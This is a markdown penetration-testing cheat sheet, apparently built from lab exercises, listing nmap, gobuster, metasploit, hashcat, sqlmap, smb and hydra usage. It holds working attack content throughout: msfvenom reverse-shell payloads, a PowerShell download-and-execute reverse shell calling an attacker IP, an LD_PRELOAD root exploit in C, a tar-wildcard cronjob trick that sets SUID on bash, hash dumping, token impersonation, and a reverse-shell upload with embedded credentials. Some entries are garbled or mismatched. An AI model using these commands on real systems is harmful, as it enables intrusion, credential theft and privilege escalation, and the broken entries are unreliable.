# Network Enumeration
Several methods to perform enumeration once you are in the same local network as the client:
##Scanner (nmap)
1. nmap -sS	for stealth scan
1. nmap -sU	for UDP scan
1. nmap -O	for OS detection
1. nmap -sV	for Service version detection
1. nmap -vv	for extra verbosity
1. nmap -oA	for saving in three different formats
1. nmap -oN	for saving in a normal format
1. nmap -oG	for saving in grepable format
1. nmap -A	for aggresive mode
1. nmap -T5	for increase speed (noisy!)
1. nmap -p-	for scanning all ports
1. nmap -sn  not scan ports, forces icmp
1. nmap -sC	for running default scripts
1. /usr/share/nmap/scripts/   scripts location

# Web enumeration 
Here we look for possible directories based on a web location
## Gobuster
Check: gobuster -h
Gobuster can get additional seclists:
```
pacman -S seclists
```
To enumerate a URL target or IP:
```
gobuster dir -u <target> -w <wordlist>
```
Some optional flags:
-x  extensions
-U  username
-P  password
-s  status code, e.g 200,400,404,204
-k  skip ssl certificate verification
-a  specify User-Agent
-h  specify a HTTP header
-u  brute force URL:
```console
gobuster dir -u <URL> -w <wordlist> -x <extension> -U <username> -P <password>
```

## Dirb
```console
dirb http://<IP>
```
If with the above a directory was found , then run:
```console
gobuster dir -u <IP>/<found_dir>/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x txt
```

## Nikto
Check if URL is vulnerable
```console
nikto -h <URL>
```

## Web Responses:
The general range of the responses is:

100-199: Information
200-299: Successes (200 OK is the "normal" response for a GET)
300-399: Redirects (the information you want is elsewhere)
400-499: Client errors (You did something wrong, like asking for something that doesn't exist)
500-599: Server errors (The server tried, but something went wrong on their side)

More information can be found at [link](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)

## Cookie Exploration using `curl`
In order, GET request, GET request and write cookie, GET request and set a cookie, POST request with data given.
```console
curl -X GET http://<IP>/path/to/file
curl -X GET http://<IP>/path/to/file -c file_to_write_cookie
curl -X GET http://<IP>/path/to/file -b "NAME=VALUE"
curl -X POST http://<IP>/path/to/file --data "flag_please"
```

# msfconsole
Some useful commands:
```console
info
options
advanced
set payload
set arch
```
Exploit in the background
```console
exploit -j
```
Go to interactive mode
```
session -i <number> to go to interactive mode
```
You could upgrade to meterpreter by using the module:
```console
sessions -u <number>
```
Another option is to use the following module
```console
use post/multi/manage/shell_to_meterpreter
```

# meterpreter
To download/upload to target, send session to background :
```console
download
upload
background
```
To list and change process:
```
console
ps
migrate <PID>
```
Execute command in remote host, downgrade to shell, search files on target
```
console
execute <command>
shell
search <filename>
```
Tip migration to spoolsv.exe (print service) is always advisable (due to stability)
To dump the hashes of Windows using the Meterpreter:
```console
hashdump
```

# Hash crack
Sometimes to properly work with hashcat you need to install a open source implementation ofopenCL called portable OpenCL or pocl:
```console
pacman -S pocl
```
Before cracking be sure to identify them with hashid:
```console

```
Hashcat uses modes and do not autodetect the type of hash (check the mode hashcat -h)
Hascat flags:

1. -m   to specify the mode
1. -a   to enable attack mode
1. -a 3 to enable brute force attack
1. -a 3 to enable brute force attack
Example of using hashcat:
```console
hashcat -m <hashmode> -a <attackmode> -o <outputfile> <targetfile> <wordlist>
hashcat -m 0 -a 0 -o output target /usr/share/wordlists/rockyou.txt
```
John the Reaper (jtr) is also quite common to use:
```console
john --wordlist=[FILE] --format=[HASHNAME] --rules=[=SECTION]
john target --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
```
To crack the hash use:
```console
john john_hash --format=NT --wordlist=/usr/share/wordlist/rockyou.txt
```
To showed the cracked result:
```console
john john_hash --format=NT --show
```

#Sqlmap
This enumeration technique can be limited by a firewall or query request limit.
Depending of the form method used the parameters vary.
```console
sqlmap -u <URL> -g -p <parameter> --dbms=<database_backend_name> --level=<1-5> --dump --os-shell
```
Example when applying to simple form with POST method with textarea and title msg:
```console
sqlmap -u <URL> --data=msg=1
```

#Smbmap
Useful flags
-L  to list shares
-d  to enumerate a domain
--download
--upload
-s  specify a share to enumerate

To check for a smb services and list of shares
```console
smbmap -H <target_IP> -L
```
Execute commands if you have permissions
```console
-x 'ipconfig /all'
```

A password is required with the option -U
```console
smbget -R smb://<target_ip>/<accessible_share> -U <user>
```
#Smbclient
Some flags:
-W  to specify WORKGROUP
-I  to specify IP address
-c  to execute commands, use semicolon for multiple commands
-U  username
-P  password
-N  no password
To download using the interactive prompt
```console
get <filename>
```
To upload using the interactive prompt
```console
put <filename>
```
[Samba-based scripts](https://github.com/SecureAuthCorp/impacket)

# To login to the smb share
A password is required
```console
smbclient //<target_IP>/<share> -U <user>
```

# To create a salted hash like in passwd
The openssl binary is used. Also the line in passwd has the following format
```console
openssl passwd -1 -salt <salt> <password>
username:passwordhash:0:0:root:/root:/bin/bash
```

#For Linux Enumeration after initial foothold
It is not vulnerability based, but more technical.
Download the LinEnum.sh from [LinEnumRepo](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
```console
./LinEnum.sh
```
# Some useful commands for enumeration
First list all your sessions
```console
sessions 
```

To enumerate smb shares:
```console
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target_ip>
```

To enumerate file system:
```console
nmap -p <number> --script=nfs-ls,nfs-statfs,nfs-showmount <target_ip>
```

# SSH commands
To login with a particular private key
```console
ssh -i id_rsa <username>@<target_ip>
```
When there is no matching host key type found. Their offer: ssh-rsa
Then you need to add the key type manually as follows:
```console
ssh -oHostKeyAlgorithms=+ssh-rsa <user>@<IP> -p <number>
```

# Search commands
To look for SUID (suid) bits enable:
```console
find / -perm -u=s -type f 2>/dev/null
```

# Upgrade shell to meterpreter
```console
search multi/manage/shell_to_meterpreter
```

# Load and run powershell in meterpreter
```console
load powershell
powershell_shell
```

# To create a msfvenoms payload with meterpreter reverse shell
```console
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.146.199 LPORT=4444 -f exe -o alfred.exe
```

# To download from a python server using powershell
```console
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.146.199:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.146.199 -Port 4343
```
or
```console
powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe
```

# To see privilege information in windows
```console
whoami /priv
```

# To impersonate other tokens using meterpreter
```console
load incognito
list_tokens -g
```

# To become NT system
```console
impersonate_token "BUILTIN\Administrators"
then migrate to a SYSTEM process (usually services.exe)
migrate <PID of services.exe>          
```

# Hydra brute force post
The http-post-form method require three arguments splitted by ":"
1. "Account/login.aspx", which you get from the URL 
2. "\_\_VIEWSTATE...Log+in", which you get using Burpsuite. Observe that you need also to insert ^USER^ and ^PASS^
3. Login Failed. Which is the most common case, deviations will be given as output.

```console
hydra - v -l admin -P /usr/share/wordlist/rockyou.txt <target_IP> http-post-form "/Account/login.aspx:__VIEWSTATE=i7MQNEYxCpsuWpX%2FARpaWiNDZbLxzhra5gcXSs0jSsiEg18uQztWWGsZy4ofbcUHTEqDrAnDifUKYN%2FCBdKAokaVydVNCiAwGHV4kPsIPzXP3xuFzYfOcCIDtBW0F7mNfw2AT%2BVl2rNLN4Cr8Ur9ReRZUq7%2BzU8yJjvGQcuanNcRj05P&__EVENTVALIDATION=wxH6yuXUPcWQy8HL%2F3WLAm2XyiAzbFlRZrMVEfPOK8DEZRYsARugOtVfq0q8lMKCsGX7%2BF0CdBZGVhwG97qfj%2FqoPwGgR9Hivgq8btr6BxRC28PmKpSu%2BlSYF36OVMJbTQ%2BmYqHRNXE44DKvaSrQ%2F9Ki%2F%2FQ%2FUC%2FW6fIzV7I7M5BQFijq&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

# To abuse wildcard * in cronjobs
The below code creates a shell.sh that would be executed abusing a cronjob and setting the SUID bit on the binary /bin/bash
```
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=bash shell.sh"
echo "" > --checkpoint=1
```

# Php meterpreter using msfvenom
```console
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

# MongoDB
Start by typing mongo and then type help to look for the options, see below an example
```
mongo
show dbs
use backup
show collections
db.collections.find()
db.user.find()

```

# sudo -l 
If you see the following append to the PATH:
```console
env_keep+=LD_PRELOAD
```
and have sudo binary like:
```console
(ALL : ALL) NOPASSWD: <binary>
```
Then run the following exploit.c file:
```console
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
Compile as follows:
```console
gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
```
Run it as follows:
```console
sudo LD_PRELOAD=./exploit.so /usr/bin/sky_backup_utility
```
Abusing a root cronjob to set the SUID bit to the executable /bin/bash  
```console
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.s
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

# Ewout tips:
To update shell
```console
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z
stty raw -echo fg
curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" "http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/beats_uploader.php"
```

Use target tab in Burpsuite for manual web enumeration

#Miscelaneous Scripts
##General:
A bunch of tools and payloads for every stage of pentesting
[bunch of tools](https://github.com/swisskyrepo/PayloadsAllTheThings)

##Linux:
[old scripts](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
[popular priv escalation](https://github.com/rebootuser/LinEnum)
[another popular](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh)
[search kernel exploits](https://github.com/mzet-/linux-exploit-suggester)
[gtfbins](https://gtfobins.github.io)

##Windows:
[enumeration methods](https://www.fuzzysecurity.com/tutorials/16.html)
[old scripts](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)
[general enumeration](https://github.com/411Hall/JAWS)

